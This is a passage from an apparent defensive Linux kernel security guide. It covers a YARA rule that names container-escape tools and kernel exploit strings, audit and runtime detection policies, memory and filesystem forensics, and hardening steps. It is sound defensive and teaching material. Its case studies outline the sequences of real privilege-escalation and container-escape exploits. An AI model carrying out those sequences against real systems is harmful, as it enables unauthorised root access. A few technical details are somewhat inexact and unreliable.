rule container_escape_toolkit {
    meta:
        description = "Detects known container escape tools and frameworks"
        author = "Detection Engineering"
        severity = "critical"
        date = "2025-01-15"
    strings:
        // CDK (Container Penetration Toolkit) indicators
        $cdk1 = "cdk evaluate" ascii
        $cdk2 = "cdk exploit" ascii
        $cdk3 = "CDK_RUNNING" ascii
        $cdk4 = "shim-pwn" ascii
        $cdk5 = "mount-cgroup" ascii
        // DEEPCE indicators
        $deepce1 = "DEEPCE" ascii
        $deepce2 = "deepce.sh" ascii
        $deepce3 = "container_escape" ascii
        // Generic container escape patterns
        $escape1 = "release_agent" ascii
        $escape2 = "/proc/self/exe" ascii
        $escape3 = "notify_on_release" ascii
        $escape4 = "/.dockerenv" ascii
        $escape5 = "/run/secrets/kubernetes" ascii
        // Known kernel exploit binary strings
        $exploit1 = "dirty_pipe" ascii nocase
        $exploit2 = "dirtypipe" ascii nocase
        $exploit3 = "CVE-2022-0847" ascii
        $exploit4 = "CVE-2024-1086" ascii
        $exploit5 = "nf_tables" ascii
    condition:
        (2 of ($cdk1, $cdk2, $cdk3, $cdk4, $cdk5)) or
        (2 of ($deepce1, $deepce2, $deepce3)) or
        (3 of ($escape1, $escape2, $escape3, $escape4, $escape5) and
         1 of ($exploit1, $exploit2, $exploit3, $exploit4, $exploit5))
}
```

### 18.3 Auditd Configuration for Kernel Subsystem Monitoring

The Linux audit framework provides the foundation layer for kernel subsystem monitoring. A well-designed auditd configuration assigns distinct audit keys to each subsystem, enabling rapid filtering during incident response. The following configuration covers all subsystem attack surfaces discussed in this chapter. Deploy this via `/etc/audit/rules.d/90-kernel-subsystem.rules` on production systems.

```bash
## =============================================================
## Auditd rules for kernel subsystem exploitation monitoring
## Deploy to: /etc/audit/rules.d/90-kernel-subsystem.rules
## Reload:    augenrules --load && auditctl -l
## =============================================================

## -- Seccomp and sandbox operations --
-a always,exit -F arch=b64 -S seccomp -k seccomp_filter
-a always,exit -F arch=b64 -S prctl -F a0=22 -k seccomp_prctl
-a always,exit -F arch=b64 -S prctl -F a0=38 -k seccomp_prctl

## -- eBPF operations --
-a always,exit -F arch=b64 -S bpf -k ebpf_ops
-w /sys/kernel/debug/tracing -p wa -k ebpf_tracing

## -- io_uring operations --
-a always,exit -F arch=b64 -S io_uring_setup -k io_uring
-a always,exit -F arch=b64 -S io_uring_enter -k io_uring
-a always,exit -F arch=b64 -S io_uring_register -k io_uring

## -- Netfilter / nf_tables --
-a always,exit -F arch=b64 -S setsockopt -F a1=0 -F a2=64 -k netfilter_ops
-w /usr/sbin/nft -p x -k nft_exec
-w /usr/sbin/iptables -p x -k iptables_exec
-w /usr/sbin/iptables-restore -p x -k iptables_exec

## -- Kernel module operations --
-a always,exit -F arch=b64 -S init_module -k kernel_modules
-a always,exit -F arch=b64 -S finit_module -k kernel_modules
-a always,exit -F arch=b64 -S delete_module -k kernel_modules
-w /usr/sbin/insmod -p x -k module_tools
-w /usr/sbin/modprobe -p x -k module_tools
-w /usr/sbin/rmmod -p x -k module_tools

## -- Namespace operations (container escape indicators) --
-a always,exit -F arch=b64 -S unshare -k namespace_ops
-a always,exit -F arch=b64 -S clone -F a0&0x7e020000 -k namespace_clone
-a always,exit -F arch=b64 -S clone3 -k namespace_clone3
-a always,exit -F arch=b64 -S setns -k namespace_setns

## -- TTY operations --
-a always,exit -F arch=b64 -S ioctl -F a1=0x5412 -k tiocsti
-a always,exit -F arch=b64 -S ioctl -F a1=0x5414 -k tiocgptn

## -- Cgroup operations --
-w /sys/fs/cgroup -p wa -k cgroup_modify
-a always,exit -F arch=b64 -S mount -F a2&0x00800000 -k cgroup_mount

## -- Filesystem exploitation indicators --
-a always,exit -F arch=b64 -S mount -k mount_ops
-a always,exit -F arch=b64 -S umount2 -k mount_ops
-a always,exit -F arch=b64 -S pivot_root -k mount_ops
-w /proc/sys/kernel/core_pattern -p wa -k proc_write_corepattern
-w /proc/sys/kernel/modprobe -p wa -k proc_write_modprobe
-w /proc/sysrq-trigger -p wa -k proc_sysrq

## -- Unix socket operations (high-volume fd passing) --
-a always,exit -F arch=b64 -S sendmsg -F a2&0x01 -k scm_rights

## -- Device access from unexpected contexts --
-a always,exit -F arch=b64 -S openat -F path=/dev/mem -k dev_mem_access
-a always,exit -F arch=b64 -S openat -F path=/dev/kmem -k dev_kmem_access
-a always,exit -F arch=b64 -S openat -F path=/dev/port -k dev_port_access

## -- Ptrace and process memory access --
-a always,exit -F arch=b64 -S ptrace -k ptrace_ops
-a always,exit -F arch=b64 -S process_vm_readv -k proc_mem_read
-a always,exit -F arch=b64 -S process_vm_writev -k proc_mem_write

## -- Credential manipulation indicators --
-a always,exit -F arch=b64 -S setuid -F a0=0 -F auid!=0 -k setuid_root
-a always,exit -F arch=b64 -S setresuid -F a0=0 -F auid!=0 -k setuid_root
-a always,exit -F arch=b64 -S setreuid -F a0=0 -F auid!=0 -k setuid_root
```

Query audit logs by subsystem key during incident response:

```bash
# All eBPF operations in the last hour
ausearch -k ebpf_ops --start recent

# io_uring events from a specific PID
ausearch -k io_uring -p 12345

# All namespace creation events
ausearch -k namespace_ops -k namespace_clone -k namespace_clone3

# Timeline of kernel module operations
ausearch -k kernel_modules --start today --format csv | sort -t, -k2
```

### 18.4 eBPF-Based Runtime Detection

Audit-based detection captures syscall-level events but cannot observe kernel-internal behavior. eBPF-based runtime security tools attach to kernel tracepoints, kprobes, and LSM hooks to detect exploitation patterns that never surface in audit logs — such as credential structure modification, kernel object lifecycle anomalies, and in-kernel ROP/JOP execution.

**Falco rules for container escape detection.** Falco operates by attaching eBPF programs to syscall entry/exit tracepoints. The following rules detect the most common container escape patterns documented in this chapter.

```yaml
# /etc/falco/rules.d/kernel-subsystem.yaml

- rule: Container Escape via release_agent
  desc: >
    Detects writes to cgroup release_agent file from within a container,
    the primary cgroup v1 escape vector (§13.2).
  condition: >
    container and
    (evt.type = openat or evt.type = open) and
    fd.name contains "release_agent" and
    evt.arg.flags contains O_WRONLY
  output: >
    Cgroup release_agent write detected in container
    (user=%user.name container=%container.id file=%fd.name proc=%proc.name)
  priority: CRITICAL
  tags: [container_escape, cgroup]

- rule: Container Escape via core_pattern
  desc: >
    Detects writes to /proc/sys/kernel/core_pattern from within a container.
    Writing a pipe command (|/path) to core_pattern executes host commands
    when a core dump is triggered (§10.2).
  condition: >
    container and
    (evt.type = openat or evt.type = open) and
    fd.name = "/proc/sys/kernel/core_pattern" and
    evt.arg.flags contains O_WRONLY
  output: >
    core_pattern write from container
    (user=%user.name container=%container.id proc=%proc.name)
  priority: CRITICAL
  tags: [container_escape, procfs]

- rule: Unexpected eBPF Program Loading
  desc: >
    Detects BPF program loading outside of expected monitoring agents.
    eBPF verifier exploits require BPF_PROG_LOAD (§7).
  condition: >
    evt.type = bpf and
    evt.arg.cmd = BPF_PROG_LOAD and
    not proc.name in (cilium-agent, falco, tracee, tetragon, bpftrace)
  output: >
    Unexpected BPF program load (user=%user.name proc=%proc.name pid=%proc.pid)
  priority: HIGH
  tags: [ebpf_exploit, privilege_escalation]

- rule: io_uring Syscall in Container
  desc: >
    Detects io_uring_setup syscall from within containers. io_uring provides
    a seccomp bypass path (§3.4) and is a recurring source of kernel
    privilege escalation (§9).
  condition: >
    container and
    evt.type = io_uring_setup
  output: >
    io_uring_setup in container
    (container=%container.id proc=%proc.name pid=%proc.pid)
  priority: HIGH
  tags: [io_uring, seccomp_bypass]
```

**Tracee rules for kernel exploitation detection.** Tracee (Aqua Security) provides deeper kernel-level visibility than Falco by attaching to kprobes and kretprobes in addition to syscall tracepoints. Tracee policies can detect kernel object manipulation that is invisible to syscall-level monitoring.

```yaml
# tracee policy for kernel exploitation detection
apiVersion: tracee.aquasec.com/v1beta1
kind: Policy
metadata:
  name: kernel-exploit-detection
spec:
  scope:
    - global
  rules:
    - event: security_bpf_prog
      filters:
        - uid!=0
    - event: security_kernel_read_file
      filters:
        - args.type=kernel-module
    - event: cgroup_mkdir
    - event: cgroup_rmdir
    - event: security_file_open
      filters:
        - args.pathname=/proc/sys/kernel/core_pattern
        - args.pathname=/proc/sys/kernel/modprobe
        - args.pathname=/proc/sysrq-trigger
    - event: commit_creds
      filters:
        - args.new_uid=0
        - args.old_uid!=0
    - event: hidden_kernel_module
```

The `commit_creds` event is particularly valuable — Tracee hooks the `commit_creds()` kernel function and reports when a process's credentials change from non-root to root, which is the terminal step in most kernel privilege escalation exploits. This detection fires regardless of the exploitation technique used (eBPF, io_uring, netfilter, or any other subsystem).

**Tetragon enforcement policies.** Tetragon (Cilium) provides not just detection but also enforcement — it can terminate processes that match a policy in real time. Tetragon's TracingPolicy CRD hooks kprobes, tracepoints, and LSM hooks with eBPF programs that execute enforcement actions at kernel speed.

```yaml
# tetragon-kernel-enforcement.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: kernel-subsystem-enforcement
spec:
  kprobes:
    - call: security_bpf
      syscall: false
      args:
        - index: 0
          type: int
      selectors:
        - matchArgs:
            - index: 0
              operator: Equal
              values:
                - "5"  # BPF_PROG_LOAD
          matchActions:
            - action: Sigkill
              rateLimit: 0
          matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values:
                - "4026531836"  # host PID namespace inode

    - call: cgroup_release_agent_write
      syscall: false
      selectors:
        - matchActions:
            - action: Sigkill
          matchNamespaces:
            - namespace: Mnt
              operator: NotIn
              values:
                - "4026531840"  # host mount namespace inode

    - call: security_kernel_module_request
      syscall: false
      args:
        - index: 0
          type: string
      selectors:
        - matchArgs:
            - index: 0
              operator: NotPrefix
              values:
                - "/lib/modules/"
          matchActions:
            - action: Sigkill
```

This Tetragon policy terminates any process that attempts to load a BPF program from within a container namespace, write to `release_agent` from a non-host mount namespace, or request a kernel module from outside `/lib/modules/`. The enforcement is synchronous — the process is killed before the kernel operation completes, preventing the exploitation from succeeding.

### 18.5 Correlating Detection Signals

Individual detection rules produce alerts; correlating signals across layers produces high-confidence incidents. The following correlation patterns indicate active exploitation with high probability.

A correlated sequence for an nf_tables exploit (such as CVE-2024-1086) progresses through these observable stages: (1) `unshare(CLONE_NEWUSER | CLONE_NEWNET)` creates a user namespace and network namespace to gain `CAP_NET_ADMIN`, triggering the `namespace_ops` audit key; (2) a burst of `sendmsg` calls on a netlink socket sends nf_tables batch commands to trigger the UAF, producing `netfilter_ops` audit events; (3) heap spray operations via `msg_msg` or `pipe_buffer` produce characteristic allocation patterns (many `msgsnd` or `pipe` calls); (4) `commit_creds` fires in Tracee as credentials change; (5) the process performs post-exploitation actions (writes to `/etc/shadow`, opens `/dev/sda`, spawns a root shell). Seeing stages (1) through (3) in sequence from the same process within seconds constitutes a high-confidence exploitation detection, even before the credential change completes.

For eBPF verifier exploits, the sequence is: (1) `bpf(BPF_MAP_CREATE)` to create a map; (2) `bpf(BPF_PROG_LOAD)` with a crafted program; (3) the BPF program executes and modifies credentials in kernel memory; (4) the calling process now runs with uid=0 and full capabilities. Steps (1) and (2) appear in audit logs under the `ebpf_ops` key. Step (3) is invisible to audit but visible to Tracee's `commit_creds` hook. Step (4) manifests as a process performing privileged operations (opening device files, loading modules, modifying system configuration) that its pre-exploitation credentials would not allow.

---

## 19. Kernel Subsystem Forensic Analysis

Post-exploitation forensic analysis of kernel subsystem attacks requires both live-system triage and offline memory/disk forensics. The forensic artifacts differ by subsystem: eBPF exploits leave loaded BPF program metadata in kernel memory; cgroup escapes leave filesystem artifacts in the cgroup hierarchy; credential overwrites modify in-memory `struct cred` objects that are visible in memory dumps. This section provides the techniques and tools for each forensic scenario.

### 19.1 Memory Forensics with Volatility3

Volatility3 provides Linux analysis plugins that extract kernel object state from memory images or live memory (via `/proc/kcore` or LiME dumps). For kernel exploitation forensics, the relevant plugins examine syscall tables (detecting hooks), loaded modules (detecting rootkits), credential structures (detecting overwrites), and process trees (detecting hidden processes).

**Syscall table integrity verification.** A kernel exploit that installs a rootkit often hooks syscall table entries to intercept and modify system call behavior. The `linux.check_syscall` plugin compares the syscall table entries against known-good addresses from the kernel symbol table.

```bash
# Acquire memory image with LiME
sudo insmod /path/to/lime.ko "path=/tmp/memory.lime format=lime"

# Verify syscall table integrity
vol3 -f /tmp/memory.lime linux.check_syscall

# Expected clean output:
# Table  Index  Address              Symbol
# 64     0      0xffffffff81234560   __x64_sys_read
# 64     1      0xffffffff81234680   __x64_sys_write
# ...

# A hooked entry shows an unexpected address or module name:
# 64     59     0xffffffffc0123456   UNKNOWN (rootkit_module+0x42)
```

**Module integrity analysis.** The `linux.check_modules` and `linux.hidden_modules` plugins detect kernel modules that have been loaded but removed from the module list (a common rootkit concealment technique). `linux.check_modules` compares the kernel's module list against the actual module objects found in slab caches, while `linux.hidden_modules` scans memory for module structures not present in the official list.

```bash
# List loaded kernel modules
vol3 -f /tmp/memory.lime linux.lsmod

# Check for modules hidden from /proc/modules
vol3 -f /tmp/memory.lime linux.hidden_modules

# If a hidden module is found:
# Offset              Name           Size
# 0xffffffffc0120000  rootkit        8192
```

**Credential structure forensics.** The `linux.check_creds` plugin examines `struct cred` objects associated with running processes. After a successful kernel privilege escalation exploit, the target process's `cred` structure contains uid=0, gid=0, and full capability sets. By correlating the process start time (from `task_struct`) with the credential values, the analyst can identify which process was exploited and approximately when the credential overwrite occurred.

```bash
# Check process credentials for anomalies
vol3 -f /tmp/memory.lime linux.check_creds

# Look for non-login-shell processes with uid=0 that started as non-root:
# PID   PPID  UID  GID  Capabilities           Command
# 31337 1234  0    0    0x000001ffffffffff     exploit_binary
# The full capability set (0x000001ffffffffff) with uid=0 on a process that
# was originally uid=1000 indicates credential overwrite.

# Cross-reference with process tree
vol3 -f /tmp/memory.lime linux.pslist --pid 31337
vol3 -f /tmp/memory.lime linux.pstree
```

**eBPF program forensics.** Loaded eBPF programs persist in kernel memory until the owning file descriptor is closed or the process terminates. Forensic analysis of a memory image can recover the BPF program bytecode, map definitions, program type, and the process that loaded the program. While Volatility3 does not have a dedicated BPF plugin at time of writing, the `linux.lsof` plugin can identify processes with BPF file descriptors, and manual analysis of the `bpf_prog` slab cache reveals loaded programs.

```bash
# Identify processes with BPF file descriptors
vol3 -f /tmp/memory.lime linux.lsof | grep "anon_inode:bpf"

# On a live system, enumerate loaded BPF programs
bpftool prog list
bpftool prog dump xlated id <PROG_ID>
bpftool prog dump jited id <PROG_ID>
bpftool map list
bpftool map dump id <MAP_ID>

# Dump BPF program metadata for forensic preservation
bpftool prog show id <PROG_ID> --json | jq '{
  id: .id,
  type: .type,
  tag: .tag,
  loaded_at: .loaded_at,
  uid: .uid,
  bytes_xlated: .bytes_xlated,
  bytes_jited: .bytes_jited
}'
```

### 19.2 Crash Dump Analysis

When a kernel exploit triggers an oops, panic, or watchdog timeout, the resulting crash dump provides a snapshot of kernel state at the time of failure. The `crash` utility loads vmcore files (from kdump) or live `/proc/kcore` for interactive analysis. For exploitation forensics, the crash dump reveals the faulting instruction, the call stack, register values, and nearby heap/stack contents that indicate the exploitation technique used.

```bash
# Analyze a crash dump with the crash utility
crash /usr/lib/debug/boot/vmlinux-$(uname -r) /var/crash/vmcore

# Within the crash shell:

# Show the task that triggered the crash
crash> bt
# PID: 31337  TASK: ffff88810a234000  CPU: 3  COMMAND: "exploit"
#  #0 [ffffc900045abc00] page_fault at ffffffff81a00a90
#  #1 [ffffc900045abc58] nft_set_elem_destroy at ffffffff81cde420
#  #2 [ffffc900045abc88] nf_tables_delrule at ffffffff81cdf100
#  ...

# Examine the faulting address and surrounding memory
crash> rd -64 ffff88810a234000 32

# Inspect the task's cred structure
crash> task_struct.cred ffff88810a234000
  cred = 0xffff88810b567890
crash> cred.uid,gid,cap_effective 0xffff88810b567890
  uid = { val = 0 }
  gid = { val = 0 }
  cap_effective = { cap = { 0x1ffffffffff, 0x0 } }

# Search for freed but referenced objects (UAF indicator)
crash> kmem -s filp
# CACHE      OBJSIZE  ALLOCATED  TOTAL  SLABS  SSIZE  NAME
# ffff8881  256      4523       4608   288    16k    filp

# Examine nf_tables objects in memory
crash> struct nft_set ffff88810c890000
```

The combination of the call stack showing a nf_tables function and a non-root process with root credentials in its `cred` structure provides conclusive evidence of an nf_tables privilege escalation exploit.

### 19.3 Filesystem Forensics Post-Exploitation

Kernel exploits that achieve privilege escalation typically leave filesystem artifacts as the attacker performs post-exploitation activities. These artifacts differ from userspace exploitation because the attacker has unrestricted kernel-level access — modifications may bypass filesystem permissions, audit logging, and integrity monitoring.

**Rootkit indicator analysis.** After kernel exploitation, attackers frequently install kernel-level or userspace rootkits to maintain persistence. Filesystem indicators include hidden files (names beginning with dots in unusual locations), modified system binaries, unusual SUID/SGID binaries, and kernel modules in non-standard paths.

```bash
# Search for unusual SUID/SGID binaries
find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null | \
  while read line; do
    file=$(echo "$line" | awk '{print $NF}')
    rpm -V $(rpm -qf "$file" 2>/dev/null) 2>/dev/null || \
    dpkg -V $(dpkg -S "$file" 2>/dev/null | cut -d: -f1) 2>/dev/null || \
    echo "UNPACKAGED SUID: $file"
  done

# Check for modified system binaries against package database
rpm -Va 2>/dev/null | grep '^..5'   # RPM: files with changed MD5
debsums -c 2>/dev/null               # Debian: changed files

# Search for kernel modules outside standard paths
find / -name '*.ko' -o -name '*.ko.xz' -o -name '*.ko.zst' 2>/dev/null | \
  grep -v '^/lib/modules/' | grep -v '^/usr/lib/modules/'

# Check loaded modules against installed kernel packages
lsmod | awk 'NR>1{print $1}' | while read mod; do
  modinfo "$mod" 2>/dev/null | grep -q "^filename:" || \
  echo "NO MODINFO: $mod"
done
```

**Container escape forensics.** When a container escape is suspected, the forensic workflow identifies the escape vector by examining cgroup hierarchies, mount points, and container runtime logs. The escape vector determines what artifacts to look for — a cgroup `release_agent` escape leaves different traces than an overlayfs privilege escalation.

```bash
# Identify the escape vector

# Check 1: Cgroup release_agent modification
find /sys/fs/cgroup -name 'release_agent' -exec cat {} \; 2>/dev/null | \
  grep -v '^$'

# Check 2: Overlay filesystem manipulation
mount | grep overlay
# Look for overlay mounts with unexpected workdir/upperdir paths

# Check 3: /proc writable entries modified
cat /proc/sys/kernel/core_pattern
# If it begins with '|', the pipe command may be an escape payload
cat /proc/sys/kernel/modprobe
# Should be /sbin/modprobe — different value indicates modification

# Check 4: Docker/containerd audit logs
journalctl -u docker --since "1 hour ago" | grep -i "security\|escape\|mount"
crictl logs <container-id> 2>&1 | grep -i "privilege\|root\|escape"

# Check 5: Kubernetes audit log for suspicious API calls
# (API server audit log path varies by cluster configuration)
grep '"verb":"create"' /var/log/kubernetes/audit.log | \
  grep '"resource":"pods"' | \
  jq 'select(.requestObject.spec.containers[].securityContext.privileged == true)'
```

**Container image forensics.** After identifying that a container was used as the exploitation staging ground, analyzing the container image reveals what tools the attacker added. Layer diffing shows modifications between the expected image and the running container's filesystem.

```bash
# Export the running container's filesystem
docker export <container-id> -o /tmp/container-fs.tar

# Compare against the original image
docker save <image:tag> -o /tmp/image-layers.tar

# Use dive for interactive layer analysis
dive <image:tag>

# Check for exploit binaries in the container
docker diff <container-id>
# Output: A = added, C = changed, D = deleted
# Look for: A /tmp/exploit, C /usr/bin/su, A /root/.ssh/authorized_keys
```

### 19.4 Forensic Case Studies

The following case studies walk through the forensic analysis of real kernel exploitation scenarios, identifying the artifacts each exploitation technique produces and the analysis workflow to reconstruct the attack timeline.

**CVE-2022-0185 — fs_context Heap Overflow.** This vulnerability in the `legacy_parse_param()` function of the `fs_context` subsystem allowed a heap buffer overflow when processing overly long filesystem mount parameters. The overflow corrupted adjacent heap objects, enabling arbitrary code execution in kernel context. Exploitation required `CAP_SYS_ADMIN` in a user namespace.

Forensic indicators: (1) Audit logs show `unshare(CLONE_NEWUSER)` followed by mount-related syscalls with abnormally long parameter strings. The `mount_ops` audit key captures the `fsconfig` syscall (number 431 on x86_64). (2) Memory forensics reveals corrupted objects adjacent to the `fs_context` allocation in the slab cache — the overflow overwrites pointers in neighboring objects. (3) The exploited process's credential structure shows uid=0 despite the original user being unprivileged. (4) Filesystem artifacts include any post-exploitation tools dropped by the attacker after gaining root.

**CVE-2022-0847 — Dirty Pipe.** The Dirty Pipe vulnerability allowed an unprivileged user to overwrite data in read-only files by exploiting a flaw in the pipe buffer initialization. The `pipe_buf_release()` function failed to clear the `PIPE_BUF_FLAG_CAN_MERGE` flag when a pipe buffer was assigned a page from the page cache, allowing subsequent writes to the pipe to overwrite the page cache contents of arbitrary files.

Forensic indicators: (1) The exploit creates a pipe, writes to it to initialize the buffer flags, then uses `splice()` to fill the pipe buffer with a page from the target file, and finally writes to the pipe to overwrite the page cache. The syscall sequence — `pipe2()`, `write()`, `splice()`, `write()` — is distinctive. (2) The page cache contains modified file contents that do not match the on-disk file. Running `md5sum` or `sha256sum` on the file produces a hash matching the modified content, while reading the block device directly shows the original content (the modification exists only in the page cache unless synced to disk). (3) If the attacker modified `/etc/passwd` to insert a root-equivalent account, `getent passwd` shows the injected entry. (4) The modification does not generate audit events for file writes because the write goes through the pipe/page-cache path, not through the normal VFS write path. This audit-evasion property makes filesystem integrity monitoring (AIDE, OSSEC, Tripwire) the primary detection mechanism.

**CVE-2023-32233 — nf_tables Anonymous Set UAF.** This vulnerability in the handling of anonymous sets during nf_tables batch processing allowed a use-after-free when a rule deletion freed a set that was still referenced by concurrent batch operations. Exploitation produced arbitrary read/write in kernel memory via controlled reuse of the freed set object.

Forensic indicators: (1) Audit logs under the `netfilter_ops` and `namespace_ops` keys show user namespace creation followed by rapid netlink `sendmsg` calls carrying nf_tables batch messages. (2) The `nft list ruleset` command (run on a live system or reconstructed from memory) may show anomalous rules or sets that the attacker created during exploitation. (3) Memory forensics reveals `nft_set` objects in the slab cache with corrupted linked-list pointers — the freed-then-reused set contains attacker-controlled data in fields that should contain valid kernel pointers. (4) The `commit_creds` Tracee event fires when the exploit overwrites the process credentials. (5) Post-exploitation, the attacker's process has full capabilities despite running within what was originally a user-namespace-confined context. The crash dump (if the exploit triggered a secondary fault) shows the nf_tables call stack at the point of the UAF dereference.

**CVE-2024-0582 — io_uring Page UAF.** This vulnerability in `io_uring`'s `IORING_OP_PROVIDE_BUFFERS` / `IORING_OP_MMAP` interaction allowed a use-after-free on registered buffer pages. The kernel freed pages that were still mapped into the io_uring ring, giving userspace read/write access to freed physical pages that could be reallocated for other kernel objects.

Forensic indicators: (1) The `io_uring` audit key captures `io_uring_setup` and `io_uring_register` calls. (2) The exploit process has io_uring file descriptors visible in `/proc/PID/fd/` or `linux.lsof` Volatility3 output. (3) Memory analysis reveals `io_ring_ctx` structures with buffer registrations pointing to pages that have been freed from the io_uring context but remain mapped. (4) The attacker uses the dangling page mapping to read and write kernel objects allocated on the freed pages. Depending on the heap spray object used (msg_msg, pipe_buffer, sk_buff), the corresponding slab cache shows objects with corrupted contents. (5) Credential overwrite artifacts are identical to other privilege escalation exploits — the `cred` structure contains root UID and full capabilities.

---

## 20. Kernel Subsystem Hardening Guide

Hardening kernel subsystems requires a layered approach: disable unneeded subsystems entirely where possible, restrict access to remaining subsystems via sysctls, capabilities, and seccomp filters, and enforce mandatory access controls via LSMs. This section provides a systematic hardening guide organized by subsystem, with specific configuration directives, verification commands, and performance impact assessments for each recommendation.

### 20.1 Seccomp Hardening

Effective seccomp profiles require a methodology for discovering the minimal syscall set a workload needs. An overly permissive profile provides a false sense of security, while an overly restrictive profile causes application failures. The reliable approach is empirical: observe the workload under realistic conditions, record every syscall invoked, and construct an allowlist from the observations.

**Seccomp profile generation pipeline.** The standard pipeline uses `strace` or eBPF-based syscall tracing to capture the workload's syscall set, then converts the trace into an OCI-format seccomp profile.

```bash
# Step 1: Trace all syscalls used by the application
strace -f -o /tmp/trace.log -e trace=all ./application --typical-workload

# Step 2: Extract unique syscall names
grep -oP '(?<=^[0-9]+ )[a-z_0-9]+' /tmp/trace.log | sort -u > /tmp/syscalls.txt

# Step 3: Generate OCI seccomp profile from the syscall list
python3 -c "
import json, sys
syscalls = [line.strip() for line in open('/tmp/syscalls.txt')]
profile = {
    'defaultAction': 'SCMP_ACT_ERRNO',
    'defaultErrnoRet': 1,
    'architectures': ['SCMP_ARCH_X86_64', 'SCMP_ARCH_X86'],
    'syscalls': [{'names': syscalls, 'action': 'SCMP_ACT_ALLOW'}]
}
json.dump(profile, sys.stdout, indent=2)
" > /tmp/seccomp-profile.json

# Step 4: Test the profile (log violations without killing)
# Modify defaultAction to SCMP_ACT_LOG for testing phase
docker run --security-opt seccomp=/tmp/seccomp-profile.json myapp:latest

# Step 5: Monitor for seccomp violations during testing
journalctl -k | grep SECCOMP
```

An alternative approach uses the OCI runtime's built-in seccomp logging. The `oci-seccomp-bpf-hook` tool attaches an eBPF program to the container's syscall entry point and records every invoked syscall, producing a ready-to-use OCI profile at container exit.

**Production sandbox analysis.** Chrome and Firefox provide reference examples of production-grade seccomp profiles. Chrome's sandbox (the Chromium `sandbox/linux/seccomp-bpf-helpers/` directory) demonstrates several design principles worth adopting: (1) architecture validation as the first BPF instruction, rejecting non-x86_64 architectures immediately; (2) argument filtering on security-sensitive syscalls rather than blanket allow/deny — for example, `mprotect` is allowed only without `PROT_EXEC`, `clone` is allowed only with specific flag combinations, and `prctl` is allowed only for specific operations; (3) `SECCOMP_RET_TRAP` (delivering `SIGSYS`) for debugging rather than `SECCOMP_RET_KILL` during development, switched to `SECCOMP_RET_KILL_PROCESS` in release builds. Firefox follows a similar model through its content-process sandbox.

**Seccomp strict vs filter mode selection.** Strict mode (§2.1) provides the strongest possible sandbox — only `read`, `write`, `exit`, and `sigreturn` are permitted. Use strict mode for pure computation processes that receive input on an already-open file descriptor and produce output on another already-open file descriptor. Cryptographic computation engines, compression workers, and format-conversion processes are candidates. Filter mode (§2.2) is required for any process that needs additional syscalls beyond the strict-mode set. The trade-off is that filter mode requires maintaining a correct and complete filter program, while strict mode has zero configuration surface.

### 20.2 eBPF Hardening

The eBPF subsystem is both a powerful defensive tool and a dangerous attack surface. Hardening eBPF requires restricting who can load programs, what programs can do, and how the verifier validates them.

**Restricting BPF access.** The primary sysctl `kernel.unprivileged_bpf_disabled` controls whether non-root users can load BPF programs. The value semantics are nuanced and have evolved across kernel versions:

```bash
# Value 0: unprivileged BPF allowed (insecure, exploit-enabling)
# Value 1: unprivileged BPF disabled, can be re-enabled by root
# Value 2: unprivileged BPF disabled permanently (cannot be re-enabled
#           without reboot) — available since Linux 5.16

sysctl -w kernel.unprivileged_bpf_disabled=2

# Verify the setting
sysctl kernel.unprivileged_bpf_disabled
# Expected output: kernel.unprivileged_bpf_disabled = 2

# Persist across reboots
echo 'kernel.unprivileged_bpf_disabled=2' > /etc/sysctl.d/90-ebpf-hardening.conf
```

The distinction between `CAP_BPF` and `CAP_SYS_ADMIN` matters for least-privilege deployments. `CAP_BPF` (introduced in Linux 5.8) grants the ability to load BPF programs and create maps without the full power of `CAP_SYS_ADMIN`. Monitoring tools (Falco, Tracee, Tetragon) should run with `CAP_BPF` + `CAP_PERFMON` (for reading kernel memory via BPF helpers) rather than `CAP_SYS_ADMIN`. This limits the blast radius if the monitoring agent is compromised.

**BPF token delegation (Linux 6.9+).** The BPF token mechanism allows a privileged process to create a token that delegates specific BPF capabilities to another process without granting full `CAP_BPF`. The token specifies which program types, map types, and helper functions the delegate can use. This enables containerized monitoring agents to load specific BPF program types without requiring broad capabilities.

```bash
# Check if BPF token is supported (kernel 6.9+)
grep -q BPF_TOKEN_CREATE /proc/kallsyms && echo "BPF token supported"
```

**Kernel lockdown mode impact.** The kernel lockdown LSM (enabled via `lockdown=integrity` or `lockdown=confidentiality` kernel parameter) restricts BPF operations alongside other sensitive kernel interfaces. In integrity mode, BPF programs that write to kernel memory are blocked. In confidentiality mode, BPF programs that read arbitrary kernel memory are also blocked. This affects security monitoring tools that use BPF `bpf_probe_read_kernel()` — they require confidentiality mode to be relaxed or must use BPF Type Format (BTF)-based read helpers that are subject to verifier validation.

**JIT hardening.** The BPF JIT compiler converts BPF bytecode to native machine code for performance. JIT hardening adds constant blinding (randomizing immediate values to prevent JIT spray attacks) and disables writable-executable JIT memory.

```bash
# Enable BPF JIT hardening
sysctl -w net.core.bpf_jit_harden=2

# Value 0: no hardening
# Value 1: harden for unprivileged users only
# Value 2: harden for all users (recommended)

echo 'net.core.bpf_jit_harden=2' >> /etc/sysctl.d/90-ebpf-hardening.conf
```

### 20.3 io_uring Hardening

The io_uring subsystem has produced a disproportionate number of kernel vulnerabilities relative to its codebase size (§9). For environments that do not require io_uring's performance characteristics, disabling it entirely is the strongest hardening measure. For environments that depend on io_uring (high-performance databases, storage engines), restricting access and monitoring usage provides defense in depth.

**Disabling io_uring.** The `io_uring_disabled` sysctl (Linux 6.6+) provides three levels of restriction. Cross-reference §9.3 for the basic sysctl; additional context on deployment follows.

```bash
# Disable io_uring for unprivileged users (recommended minimum)
sysctl -w io_uring_disabled=1

# Disable io_uring entirely (strongest hardening)
sysctl -w io_uring_disabled=2

# Persist
echo 'io_uring_disabled=2' > /etc/sysctl.d/90-io-uring.conf

# Verify: attempt io_uring_setup should return EPERM or ENOSYS
python3 -c "
import ctypes, os
libc = ctypes.CDLL('libc.so.6', use_errno=True)
ret = libc.syscall(425, 32, 0)  # io_uring_setup(entries=32, params=NULL)
print(f'io_uring_setup returned: {ret}, errno: {os.strerror(ctypes.get_errno())}')
"
```

**Seccomp-based io_uring blocking for containers.** In environments where the host needs io_uring but containers should not have access, the container's seccomp profile should block `io_uring_setup` (425), `io_uring_enter` (426), and `io_uring_register` (427). The Docker default seccomp profile already blocks these on recent versions, but custom profiles must include them explicitly.

